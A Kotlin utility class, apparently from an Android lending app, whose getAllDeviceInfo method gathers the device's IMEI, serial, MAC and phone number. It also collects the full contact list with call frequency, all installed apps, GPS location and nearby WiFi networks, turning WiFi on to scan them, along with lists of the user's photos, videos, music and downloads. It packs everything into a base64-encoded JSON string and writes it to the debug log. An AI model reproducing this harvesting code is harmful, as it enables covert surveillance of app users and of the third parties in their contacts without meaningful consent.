package com.ecreditpal.danaflash.helper

import android.Manifest
import android.annotation.SuppressLint
import android.app.Activity
import android.app.ActivityManager
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.ApplicationInfo
import android.content.pm.PackageInfo
import android.content.pm.PackageManager
import android.hardware.input.InputManager
import android.location.Criteria
import android.location.LocationManager
import android.net.wifi.WifiManager
import android.os.*
import android.os.storage.StorageManager
import android.provider.ContactsContract
import android.telephony.PhoneStateListener
import android.telephony.SignalStrength
import android.telephony.TelephonyManager
import android.text.TextUtils
import android.text.format.Formatter
import androidx.core.app.ActivityCompat
import com.alibaba.fastjson.JSON
import com.blankj.utilcode.util.*
import com.ecreditpal.danaflash.model.DeviceInfoBean
import java.io.BufferedReader
import java.io.File
import java.io.IOException
import java.io.InputStreamReader
import java.util.*
import kotlin.collections.ArrayList
import kotlin.math.pow


class DeviceInfoUtil {

    @SuppressLint("MissingPermission")
    fun getAllDeviceInfo(context: Context, gaid: String?): String? {
        //获取hardware
        val deviceInfoBean = DeviceInfoBean()
        val hardware = DeviceInfoBean.Hardware()
        hardware.device_name = Build.DEVICE
        hardware.sdk_version = Build.VERSION.SDK
        hardware.model = Build.MODEL
        hardware.release = Build.VERSION.RELEASE
        hardware.brand = Build.BRAND
        hardware.serial_number = Build.SERIAL
        val dm = context.resources.displayMetrics
        val width = dm.widthPixels
        val height = dm.heightPixels
        val x = width.toDouble().pow(2.0)
        val y = height.toDouble().pow(2.0)
        val diagonal = Math.sqrt(x + y)
        val dens = dm.densityDpi
        val screenInches = diagonal / dens.toDouble()
        hardware.physical_size = screenInches.toString() + ""
        deviceInfoBean.hardware = hardware

        //获取storage
        val storage = DeviceInfoBean.Storage()
        var size: Long = 0
        val activityManager = context
            .getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
        val outInfo = ActivityManager.MemoryInfo()
        activityManager.getMemoryInfo(outInfo)
        size = outInfo.totalMem
        storage.ram_total_size = Formatter.formatFileSize(context, size)
        size = outInfo.availMem
        storage.ram_usable_size = Formatter.formatFileSize(context, size)
        var memorys = getStorageInfo(context, EXTERNAL_STORAGE)
        storage.memory_card_size_use = if (memorys.isNotEmpty()) memorys[0] else ""
        storage.memory_card_size = if (memorys.size > 1) memorys[1] else ""
        memorys = getStorageInfo(context, INTERNAL_STORAGE)
        storage.internal_storage_usable = if (memorys.isNotEmpty()) memorys[0] else ""
        storage.internal_storage_total = if (memorys.size > 1) memorys[1] else ""
        deviceInfoBean.storage = storage

        //general_data
        val generalData = DeviceInfoBean.General()
        generalData.gaid = (gaid)
        generalData.and_id = (Build.SERIAL)
        generalData.phone_type = (getPhoneType(context))
        generalData.mac = (DeviceUtils.getMacAddress())
        generalData.language = (Locale.getDefault().language)
        generalData.locale_display_language = (Locale.getDefault().displayLanguage)
        generalData.locale_iso3_language = (Locale.getDefault().isO3Language)
        generalData.locale_iso3_country = (Locale.getDefault().isO3Country)
        generalData.imei = (PhoneUtils.getIMEI())
        generalData.phone_number = (getNativePhoneNumber(context))
        generalData.network_operator_name = (NetworkUtils.getNetworkOperatorName())
        generalData.network_type = (NetworkUtils.getNetworkType().name)
        generalData.time_zone_id = (TimeZone.getDefault().id)
        deviceInfoBean.general = (generalData)

        //OtherData
        val otherData = DeviceInfoBean.Other()
        otherData.root_jailbreak = (if (DeviceUtils.isDeviceRooted()) "1" else "0")
        otherData.last_boot_time = (SystemClock.elapsedRealtime().toString() + "")
        val inputManager = context.getSystemService(Context.INPUT_SERVICE) as InputManager
        val devices = inputManager.inputDeviceIds
        otherData.keyboard = (if (devices.isNotEmpty()) devices[0].toString() + "" else "0")
        otherData.simulator = (if (checkIsNotRealPhone()) "0" else "1")
        otherData.dbm = (getMobileNetworkSignal(context).toString() + "")
        deviceInfoBean.other = (otherData)

        //appInfo
        deviceInfoBean.application = getAllAppsInfo(context)

        //network
        val networkBean = DeviceInfoBean.NetworkBean()
        networkBean.iP = (NetworkUtils.getIPAddress(true))
        val wifiManger = context.getSystemService(Context.WIFI_SERVICE) as WifiManager
        val wifiInf = wifiManger.connectionInfo
        val currentWifi = DeviceInfoBean.CurrentWifi()
        currentWifi.name = wifiInf?.ssid ?: ""
        currentWifi.bssid = wifiInf?.bssid ?: ""
        currentWifi.mac = wifiInf?.macAddress ?: ""
        currentWifi.ssid = wifiInf?.ssid ?: ""
        networkBean.current_wifi = currentWifi
        networkBean.configured_wifi = (getScanWifiInfo(context))
        deviceInfoBean.network = networkBean

        //location
        val locationBean = DeviceInfoBean.LocationBean()
        locationBean.gps = (getLocationInfo(context))
        deviceInfoBean.location = (locationBean)

        //充电信息
        val batteryStatus = DeviceInfoBean.BatteryStatus()
        val filter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
        val receiver = context.registerReceiver(null, filter)
        val level = receiver!!.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
        val scale = receiver.getIntExtra(BatteryManager.EXTRA_SCALE, -1)
        val batteryPct = level * 100 / scale.toFloat()
        batteryStatus.battery_pct = (batteryPct.toString() + "")
        // Are we charging / charged?
        val status = receiver.getIntExtra(BatteryManager.EXTRA_STATUS, -1)
        val isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING ||
                status == BatteryManager.BATTERY_STATUS_FULL
        batteryStatus.is_charging = (if (isCharging) "1" else "")
        // How are we charging?
        val chargePlug = receiver.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1)
        val usbCharge = chargePlug == BatteryManager.BATTERY_PLUGGED_USB
        val acCharge = chargePlug == BatteryManager.BATTERY_PLUGGED_AC
        batteryStatus.is_ac_charge = (if (acCharge) "0" else "")
        batteryStatus.is_usb_charge = (if (usbCharge) "1" else "")
        deviceInfoBean.battery_status = (batteryStatus)

        //Contact
        deviceInfoBean.contact = (getAllContacts(context))

        //其它
        deviceInfoBean.audio_internal = (FileUtil.getMusics(context, false).toString() + "")
        deviceInfoBean.audio_external = (FileUtil.getMusics(context, true).toString() + "")
        deviceInfoBean.images_internal = (FileUtil.getImages(context, false).toString() + "")
        deviceInfoBean.images_external = (FileUtil.getImages(context, true).toString() + "")
        deviceInfoBean.video_internal = (FileUtil.getVideos(context, false).toString() + "")
        deviceInfoBean.video_external = (FileUtil.getVideos(context, true).toString() + "")
        deviceInfoBean.download_files = (FileUtil.getDownload(context).toString() + "")
        deviceInfoBean.contact_group = (FileUtil.getContacts(context).toString() + "")
        LogUtils.d(
            """
            设备信息：
            ${JSON.toJSONString(deviceInfoBean)}
            """.trimIndent()
        )
        return EncodeUtils.base64Encode2String(JSON.toJSONString(deviceInfoBean).toByteArray())
    }

    private val INTERNAL_STORAGE = 0
    private val EXTERNAL_STORAGE = 1

    private fun getStoragePath(context: Context, type: Int): String? {
        val sm = context
            .getSystemService(Context.STORAGE_SERVICE) as StorageManager
        try {
            val getPathsMethod = sm.javaClass.getMethod(
                "getVolumePaths",
                null
            )
            val path = getPathsMethod.invoke(sm, null) as Array<String>
            when (type) {
                INTERNAL_STORAGE -> return path[type]
                EXTERNAL_STORAGE -> return if (path.size > 1) {
                    path[type]
                } else {
                    null
                }
                else -> {
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
        return null
    }

    private fun getStorageInfo(context: Context, type: Int): List<String?> {
        val path = getStoragePath(context, type)
        val lists: MutableList<String?> = ArrayList()
        /**
         * 无外置SD 卡判断
         */
        if (!(Environment.getExternalStorageState() == Environment.MEDIA_MOUNTED) || TextUtils.isEmpty(
                path
            ) || path == null
        ) {
            return lists
        }
        val file = File(path)
        val statFs = StatFs(file.path)
        val blockCount = statFs.blockCountLong
        val bloackSize = statFs.blockSizeLong
        val totalSpace = bloackSize * blockCount
        val availableBlocks = statFs.availableBlocksLong
        val availableSpace = availableBlocks * bloackSize
        lists.add(Formatter.formatFileSize(context, availableSpace))
        lists.add(Formatter.formatFileSize(context, totalSpace))
        return lists
    }

    /**
     * 获取手机类型，NONE、GSM、CDMA、SIP
     * PHONE_TYPE_NONE.NONE、
     * PHONE_TYPE_NONE.GSM、
     * PHONE_TYPE_NONE.CDMA、
     * PHONE_TYPE_NONE.SIP
     *
     * @param context
     * @return
     */
    private fun getPhoneType(context: Context): String? {
        val manager = context
            .getSystemService(Activity.TELEPHONY_SERVICE) as TelephonyManager
        return when (manager.phoneType) {
            1 -> "GSM"
            2 -> "CDMA"
            3 -> "SIP"
            else -> "NONE"
        }
    }

    //获取电话号码
    private fun getNativePhoneNumber(context: Context): String? {
        val telephonyManager =
            context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        var nativePhoneNumber: String? = ""
        if (ActivityCompat.checkSelfPermission(
                context,
                Manifest.permission.READ_SMS
            ) == PackageManager.PERMISSION_DENIED || ActivityCompat.checkSelfPermission(
                context,
                Manifest.permission.READ_PHONE_NUMBERS
            ) == PackageManager.PERMISSION_DENIED || ActivityCompat.checkSelfPermission(
                context,
                Manifest.permission.READ_PHONE_STATE
            ) == PackageManager.PERMISSION_DENIED
        ) {
            return ""
        }
        nativePhoneNumber = telephonyManager.line1Number
        return nativePhoneNumber
    }

    /*
     *根据CPU是否为电脑来判断是否为模拟器
     *返回:true 为模拟器
     */
    private fun checkIsNotRealPhone(): Boolean {
        val cpuInfo = readCpuInfo()
        return cpuInfo.contains("intel") || cpuInfo.contains("amd")
    }

    /*
     *根据CPU是否为电脑来判断是否为模拟器(子方法)
     *返回:String
     */
    private fun readCpuInfo(): String {
        var result = ""
        try {
            val args = arrayOf("/system/bin/cat", "/proc/cpuinfo")
            val cmd = ProcessBuilder(*args)
            val process = cmd.start()
            val sb = StringBuffer()
            var readLine: String? = ""
            val responseReader = BufferedReader(InputStreamReader(process.inputStream, "utf-8"))
            while (responseReader.readLine().also { readLine = it } != null) {
                sb.append(readLine)
            }
            responseReader.close()
            result = sb.toString().toLowerCase(Locale.ROOT)
        } catch (ex: IOException) {
        }
        return result
    }

    private fun getMobileNetworkSignal(context: Context): Int {
        val re = intArrayOf(0)
        if (!hasSimCard(context)) {
            return re[0]
        }
        val mTelephonyManager =
            context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        mTelephonyManager.listen(object : PhoneStateListener() {
            override fun onSignalStrengthsChanged(signalStrength: SignalStrength) {
                super.onSignalStrengthsChanged(signalStrength)
                val asu = signalStrength.gsmSignalStrength
                val lastSignal = -113 + 2 * asu
                if (lastSignal > 0) {
                    re[0] = lastSignal
                }
            }
        }, PhoneStateListener.LISTEN_SIGNAL_STRENGTHS)
        return re[0]
    }

    /**
     * 判断是否包含SIM卡
     *
     * @return 状态
     */
    private fun hasSimCard(context: Context): Boolean {
        val telMgr = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        val simState = telMgr.simState
        var result = true
        when (simState) {
            TelephonyManager.SIM_STATE_ABSENT, TelephonyManager.SIM_STATE_UNKNOWN -> result =
                false // 没有SIM卡
        }
        return result
    }

    private fun getLocationInfo(context: Context): DeviceInfoBean.GPS? {
        val locationBean: DeviceInfoBean.GPS = DeviceInfoBean.GPS()
        val mLocationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
        val criteria = Criteria()
        criteria.accuracy = Criteria.ACCURACY_FINE
        //设置不需要获取海拔方向数据
        criteria.isAltitudeRequired = false
        criteria.isBearingRequired = false
        //设置允许产生资费
        criteria.isCostAllowed = true
        //要求低耗电
        criteria.powerRequirement = Criteria.POWER_LOW
        if (ActivityCompat.checkSelfPermission(
                context,
                Manifest.permission.ACCESS_FINE_LOCATION
            ) != PackageManager.PERMISSION_GRANTED
            && ActivityCompat.checkSelfPermission(
                context,
                Manifest.permission.ACCESS_COARSE_LOCATION
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            return locationBean
        }
        val provider: String?
        val providers = mLocationManager.getProviders(true)
        provider = when {
            providers.contains(LocationManager.NETWORK_PROVIDER) -> {
                LocationManager.NETWORK_PROVIDER
            }
            providers.contains(LocationManager.PASSIVE_PROVIDER) -> {
                LocationManager.GPS_PROVIDER
            }
            else -> mLocationManager.getBestProvider(criteria, true)
        }
        val location = mLocationManager.getLastKnownLocation(provider!!)
        if (location == null) {
            mLocationManager.requestLocationUpdates(
                provider, 10000, 0f
            ) {
                locationBean.latitude = (it.latitude.toString() + "")
                locationBean.longitude = (it.longitude.toString() + "")
            }
        } else {
            locationBean.latitude = (location.latitude.toString() + "")
            locationBean.longitude = (location.longitude.toString() + "")
        }
        return locationBean
    }

    private fun getAllContacts(context: Context): List<DeviceInfoBean.Contact>? {
        val contacts: ArrayList<DeviceInfoBean.Contact> = ArrayList()
        val cursor = context.contentResolver.query(
            ContactsContract.Contacts.CONTENT_URI, null, null, null, null
        ) ?: return emptyList()
        while (cursor.moveToNext()) {
            //新建一个联系人实例
            val temp: DeviceInfoBean.Contact = DeviceInfoBean.Contact()
            val contactId = cursor.getString(
                cursor
                    .getColumnIndex(ContactsContract.Contacts._ID)
            )
            //获取联系人姓名
            val name = cursor.getString(
                cursor
                    .getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)
            )
            temp.contact_display_name = name

            //获取联系人电话号码
            val phoneCursor = context.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null,
                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=" + contactId,
                null,
                null
            )
            while (phoneCursor!!.moveToNext()) {
                var phone =
                    phoneCursor.getString(phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
                phone = phone.replace("-", "")
                phone = phone.replace(" ", "")
                temp.number = phone
                val time =
                    phoneCursor.getString(phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.LAST_TIME_CONTACTED))
                temp.last_time_contacted = (time)
                val timeC =
                    phoneCursor.getString(phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TIMES_CONTACTED))
                temp.times_contacted = (timeC)
                val upTime =
                    phoneCursor.getString(phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_LAST_UPDATED_TIMESTAMP))
                temp.up_time = upTime
            }
            contacts.add(temp)
            //记得要把cursor给close掉
            phoneCursor.close()
        }
        cursor.close()
        return contacts
    }

    private fun getScanWifiInfo(context: Context): List<DeviceInfoBean.CurrentWifi> {
        val list: MutableList<DeviceInfoBean.CurrentWifi> = ArrayList()
        val mWifiManager = context.getSystemService(Context.WIFI_SERVICE) as WifiManager
        // 如果WiFi未打开，先打开WiFi
        if (!mWifiManager.isWifiEnabled) mWifiManager.isWifiEnabled = true

        // 开始扫描WiFi
        mWifiManager.startScan()
        // 获取并保存WiFi扫描结果
        val scanResults = mWifiManager.scanResults
        for (sr in scanResults) {
            val currentWifi = DeviceInfoBean.CurrentWifi()
            currentWifi.bssid = (sr.BSSID)
            currentWifi.mac = ""
            currentWifi.ssid = sr.SSID
            currentWifi.name = sr.SSID
            list.add(currentWifi)
        }
        return list
    }

    private fun getAllAppsInfo(context: Context): List<DeviceInfoBean.AppInfo>? {
        val appInfoBeans: MutableList<DeviceInfoBean.AppInfo> = ArrayList()
        //        List<PackageInfo> apps = new ArrayList<PackageInfo>();
        val pManager = context.packageManager
        //获取手机内所有应用
        val paklist = pManager.getInstalledPackages(0)
        for (i in paklist.indices) {
            val pak = paklist[i] as PackageInfo
            //判断是否为非系统预装的应用程序
            val appInfoBean: DeviceInfoBean.AppInfo = DeviceInfoBean.AppInfo()
            appInfoBean.app_name = (pManager.getApplicationLabel(pak.applicationInfo).toString())
            appInfoBean.package_name = (pak.packageName)
            appInfoBean.in_time = (pak.firstInstallTime.toString() + "")
            if (pak.applicationInfo.flags and ApplicationInfo.FLAG_SYSTEM <= 0) {
                appInfoBean.app_type = ("0")
            } else appInfoBean.app_type = ("1")
            appInfoBean.version_name = (pak.versionName)
            appInfoBean.version_code = (pak.versionCode.toString() + "")
            appInfoBean.flags = (pak.applicationInfo.flags.toString() + "")
            appInfoBean.up_time = (pak.lastUpdateTime.toString() + "")
            appInfoBeans.add(appInfoBean)
        }
        return appInfoBeans
    }
}